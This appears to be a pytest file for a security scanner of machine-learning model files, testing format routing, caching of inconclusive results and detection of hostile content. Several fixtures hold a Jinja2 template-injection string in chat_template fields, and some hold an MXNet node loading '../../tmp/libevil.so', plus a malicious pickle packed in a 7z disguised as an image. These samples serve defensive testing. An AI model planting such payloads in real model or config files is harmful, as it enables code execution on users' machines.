    monkeypatch.setattr(core_module, "detect_file_format", lambda _path: PROTOBUF_MODEL_CANDIDATE_FORMAT)
    monkeypatch.setattr(core_module, "detect_file_format_from_magic", lambda _path: PROTOBUF_MODEL_CANDIDATE_FORMAT)
    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)

    reset_cache_manager()
    try:
        first = scan_file(str(candidate), config=config)
        second = scan_file(str(candidate), config=config)

        assert first.success is False
        assert second.success is False
        assert first.metadata["operational_error_reason"] == "protobuf_model_routing_incomplete"
        assert first.metadata["scan_outcome"] == "inconclusive"
        check = next(check for check in first.checks if check.name == "Protobuf Model Routing")
        assert "tentative protobuf analysis was unavailable" in check.message
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_keeps_budget_exhausted_coreml_candidate_owned_by_extension(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    coreml_candidate = tmp_path / "model.mlmodel"
    coreml_candidate.write_bytes(b"\x42\x00" * 4097)

    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)

    result = scan_file(str(coreml_candidate))

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
    check = next(check for check in result.checks if check.name == "Format Detection")
    assert check.details["format"] == "coreml"
    assert check.details["preferred_scanner_id"] == "coreml"
    assert not any(check.name == "Protobuf Model Routing" for check in result.checks)


def test_scan_file_fails_closed_when_xml_root_is_beyond_bounded_probe(tmp_path: Path) -> None:
    ambiguous_xml = tmp_path / "payload.txt"
    ambiguous_xml.write_text(
        "<?xml version='1.0'?><!--" + ("x" * ((1024 * 1024) + 64)) + "--><PMML version='4.4'></PMML>",
        encoding="utf-8",
    )

    result = scan_file(str(ambiguous_xml), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["operational_error_reason"] == "xml_model_routing_incomplete"
    check = next(check for check in result.checks if check.name == "XML Model Routing")
    assert "bounded probe ended before the first structural root element" in check.message


def test_scan_file_incomplete_xml_routing_result_is_not_cached(tmp_path: Path) -> None:
    ambiguous_xml = tmp_path / "payload.txt"
    ambiguous_xml.write_text(
        "<?xml version='1.0'?><!--" + ("x" * ((1024 * 1024) + 64)) + "--><PMML version='4.4'></PMML>",
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(ambiguous_xml), config=config)
        second = scan_file(str(ambiguous_xml), config=config)

        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


@pytest.mark.parametrize(
    ("filename", "header_len"),
    [
        ("oversized.safetensors", (1024 * 1024) + 1),
        ("zlib-shaped.unknown", SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 0x9C78),
    ],
    ids=["native-suffix", "zlib-shaped"],
)
def test_scan_file_inconclusive_safetensors_header_limit_result_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
    header_len: int,
) -> None:
    payload = tmp_path / filename
    _write_sparse_oversized_safetensors_candidate(payload, header_len=header_len)
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
        "max_safetensors_header_bytes": 1024 * 1024,
    }
    monkeypatch.setattr(
        safetensors_scanner.SafeTensorsScanner,
        "calculate_file_hashes",
        lambda _self, _path: pytest.fail("inconclusive SafeTensors scans must bypass scanner hashing"),
    )
    monkeypatch.setattr(
        SecureFileHasher,
        "hash_file",
        lambda _self, _path: pytest.fail("bounded SafeTensors failures must bypass cache-key hashing"),
    )
    monkeypatch.setattr(
        SecureFileHasher,
        "hash_file_with_stat",
        lambda _self, _path, _stat: pytest.fail("bounded SafeTensors failures must bypass cache validation hashing"),
    )

    reset_cache_manager()
    try:
        first = scan_file(str(payload), config=config)
        second = scan_file(str(payload), config=config)

        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_ignores_benign_onnx_token_near_match(tmp_path: Path) -> None:
    near_match = tmp_path / "note.payload"
    near_match.write_bytes(b"this documentation mentions onnx but is not a model")

    result = scan_file(str(near_match))

    assert result.scanner_name == "unknown"
    assert result.issues == []


def test_scan_file_routes_misnamed_numpy_by_header(tmp_path: Path) -> None:
    np = pytest.importorskip("numpy")

    disguised_numpy = tmp_path / "weights.payload"
    with disguised_numpy.open("wb") as handle:
        np.save(handle, np.array([1, 2, 3], dtype=np.float32), allow_pickle=False)

    result = scan_file(str(disguised_numpy))

    assert result.scanner_name == "numpy"


def test_scan_file_routes_misnamed_sevenzip_by_header(tmp_path: Path) -> None:
    py7zr = pytest.importorskip("py7zr")

    disguised_7z = tmp_path / "archive.jpg"
    payload = tmp_path / "payload.pkl"
    payload.write_bytes(_build_malicious_pickle())

    with py7zr.SevenZipFile(disguised_7z, "w") as archive:
        archive.write(payload, arcname="payload.pkl")

    result = scan_file(str(disguised_7z))

    assert result.scanner_name == "sevenzip"
    assert any("payload.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_fails_closed_on_rar_archive(tmp_path: Path) -> None:
    rar_path = tmp_path / "archive.rar"
    rar_path.write_bytes(b"Rar!\x1a\x07\x01\x00" + b"\x00" * 32)

    result = scan_file(str(rar_path), config={"cache_scan_results": False})

    assert result.scanner_name == "rar"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "rar_archive_unsupported" in result.metadata["scan_outcome_reasons"]
    rar_check = next(check for check in result.checks if check.name == "RAR Archive Support")
    assert rar_check.severity == IssueSeverity.INFO
    assert "RAR archive contents were not scanned" in rar_check.message


def test_scan_file_does_not_fail_closed_on_rar_suffix_near_match(tmp_path: Path) -> None:
    rar_path = tmp_path / "not_really.rar"
    rar_path.write_text("plain text, not a RAR archive\n", encoding="utf-8")

    result = scan_file(str(rar_path), config={"cache_scan_results": False})

    assert result.scanner_name != "rar"
    assert result.metadata.get("scan_outcome") != "inconclusive"
    assert not any(check.name == "RAR Archive Support" for check in result.checks)


def test_scan_file_rar_inconclusive_result_is_not_cached(tmp_path: Path) -> None:
    rar_path = tmp_path / "archive.rar"
    rar_path.write_bytes(b"Rar!\x1a\x07\x01\x00" + b"\x00" * 32)
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(rar_path), config=config)
        second = scan_file(str(rar_path), config=config)

        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_routes_readme_documentation_to_text_scanner(tmp_path: Path) -> None:
    readme_path = tmp_path / "README.md"
    readme_path.write_text("# Model Card\n\nThis README is benign.\n")

    result = scan_file(str(readme_path), config={"cache_scan_results": False})

    assert result.scanner_name == "text"
    assert result.success is True


@pytest.mark.parametrize("filename", ["README", "model_card"])
def test_scan_file_routes_extensionless_documentation_to_text_scanner(tmp_path: Path, filename: str) -> None:
    documentation_path = tmp_path / filename
    documentation_path.write_text("# Model Card\n\nThis documentation is benign.\n")

    result = scan_file(str(documentation_path), config={"cache_scan_results": False})

    assert result.scanner_name == "text"
    assert result.success is True


@pytest.mark.parametrize("leading_line", ["tree model notes", "tree=implementation notes"])
def test_scan_file_keeps_tree_prefixed_readme_on_text_scanner(tmp_path: Path, leading_line: str) -> None:
    readme_path = tmp_path / "README.md"
    readme_path.write_text(
        f"{leading_line}\n"
        "tree=0\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
        "tree_sizes=12\nnum_leaves=2\nsplit_feature=0\nleaf_value=0.1 0.2\n"
        f"API Key: sk-{'A' * 48}\n",
        encoding="utf-8",
    )

    result = scan_file(str(readme_path), config={"cache_scan_results": False})

    assert result.scanner_name == "text"
    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_file_routes_model_config_json_to_manifest_scanner(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "model_type": "bert",
                "architectures": ["BertModel"],
                "hidden_size": 768,
            }
        )
    )

    result = scan_file(str(manifest_path), config={"cache_scan_results": False})

    assert result.scanner_name == "manifest"
    assert result.success is True


def test_directory_child_probe_stops_at_limit(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    def bounded_iterdir(self: Path) -> Iterator[Path]:
        for index in range(core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT):
            yield self / f"child_{index}"
        raise AssertionError("directory child probe consumed past its limit")

    monkeypatch.setattr(Path, "iterdir", bounded_iterdir)

    assert (
        core_module._count_immediate_children_up_to(
            tmp_path,
            core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT,
        )
        == core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT
    )


def test_directory_file_probe_stops_after_limit(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    def bounded_rglob(self: Path, pattern: str) -> Iterator[Path]:
        assert pattern == "*"
        for index in range(core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT + 1):
            child = self / f"child_{index}.pkl"
            child.touch()
            yield child
        raise AssertionError("directory file probe consumed past its limit")

    monkeypatch.setattr(Path, "rglob", bounded_rglob)

    assert (
        core_module._count_files_up_to(
            tmp_path,
            core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT,
        )
        is None
    )


def test_scan_directory_without_progress_skips_file_counting(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "model.pkl"
    model_path.write_bytes(b"\x80\x04N.")

    def fail_rglob(self: Path, pattern: str) -> Iterator[Path]:
        raise AssertionError(f"unexpected rglob({pattern!r}) for {self}")

    monkeypatch.setattr(Path, "rglob", fail_rglob)

    result = scan_model_directory_or_file(
        str(tmp_path),
        cache_scan_results=False,
    )

    assert result.files_scanned == 1


def test_scan_file_routes_manifest_owned_chat_templates_through_jinja_analysis(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "model_type": "llama",
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            }
        )
    )

    result = scan_file(str(manifest_path), config={"cache_scan_results": False})

    assert result.scanner_name == "manifest"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_mxnet_shaped_manifest_preserves_jinja_analysis(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "model_type": "llama",
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
                "nodes": [{"op": "Custom", "name": "load", "attrs": {"library": "../../tmp/libevil.so"}}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(manifest_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_mxnet_shaped_manifest_honors_excluded_jinja_selection(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
                "nodes": [{"op": "Custom", "name": "load", "attrs": {"library": "../../tmp/libevil.so"}}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(
        str(manifest_path),
        config={"scanners": ["mxnet", "manifest"], "cache_scan_results": False},
    )

    assert result.scanner_name == "mxnet"
    assert "jinja2_template" in result.metadata["skipped_scanner_ids"]
    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)


def test_scan_file_mxnet_shaped_tokenizer_config_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
    tokenizer_path = tmp_path / "tokenizer_config.json"
    tokenizer_path.write_text(
        json.dumps(
            {
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
                "nodes": [{"op": "Custom", "name": "load", "attrs": {"library": "../../tmp/libevil.so"}}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_mxnet_routed_tokenizer_duplicate_override_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
    tokenizer_path = tmp_path / "tokenizer_config.json"
    tokenizer_path.write_text(
        '{"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
        '"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[]}',
        encoding="utf-8",
    )

    result = scan_file(
        str(tokenizer_path),
        config={"scanners": ["mxnet", "jinja2_template"], "cache_scan_results": False},
    )

    assert result.scanner_name == "mxnet"
    assert "mxnet_symbol_invalid_structure" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_xgboost_shaped_manifest_preserves_jinja_analysis(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "version": [1, 7, 4],
                "learner": {"gradient_booster": {}},
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(manifest_path), config={"cache_scan_results": False})

    assert result.scanner_name == "xgboost"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_xgboost_shaped_manifest_honors_excluded_jinja_selection(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "version": [1, 7, 4],
                "learner": {"gradient_booster": {}},
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(
        str(manifest_path),
        config={"scanners": ["xgboost", "manifest"], "cache_scan_results": False},
    )

    assert result.scanner_name == "xgboost"
    assert "jinja2_template" in result.metadata["skipped_scanner_ids"]
    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)


def test_scan_file_xgboost_shaped_chat_template_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
    template_path = tmp_path / "chat_template.json"
    template_path.write_text(
        json.dumps(
            {
                "version": [1, 7, 4],
                "learner": {"gradient_booster": {}},
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(template_path), config={"cache_scan_results": False})

    assert result.scanner_name == "xgboost"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_malformed_xgboost_chat_template_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
    template_path = tmp_path / "chat_template.json"
    template_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",',
        encoding="utf-8",
    )

    result = scan_file(
        str(template_path),
        config={"scanners": ["xgboost", "jinja2_template"], "cache_scan_results": False},
    )

    assert result.scanner_name == "xgboost"
    assert "xgboost_json_parse_failed" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_xgboost_generation_config_runs_selected_jinja_when_manifest_excluded(tmp_path: Path) -> None:
    generation_path = tmp_path / "generation_config.json"
    generation_path.write_text(
        json.dumps(
            {
                "version": [1, 7, 4],
                "learner": {"gradient_booster": {}},
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(
        str(generation_path),
        config={"scanners": ["xgboost", "jinja2_template"], "cache_scan_results": False},
    )

    assert result.scanner_name == "xgboost"
    assert "manifest" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
